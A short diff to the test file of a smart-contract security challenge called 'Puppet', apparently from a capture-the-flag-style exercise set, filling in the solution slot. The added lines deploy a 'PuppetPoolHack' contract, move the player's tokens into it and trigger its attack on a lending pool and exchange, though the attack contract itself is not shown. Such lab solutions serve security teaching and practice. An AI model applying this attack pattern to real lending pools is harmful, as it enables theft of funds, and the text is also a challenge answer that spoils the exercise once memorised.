@@ -95,6 +95,12 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        [, , player2] = await ethers.getSigners();
+        const puppetHack = await ethers.getContractFactory('PuppetPoolHack', player2);
+        const hack = await puppetHack.deploy(player.address, token.address, uniswapExchange.address, lendingPool.address);
+        token.connect(player).transfer(hack.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await hack.connect(player2).attack({ value: 20n * 10n ** 18n });
     });
 
     after(async function () {
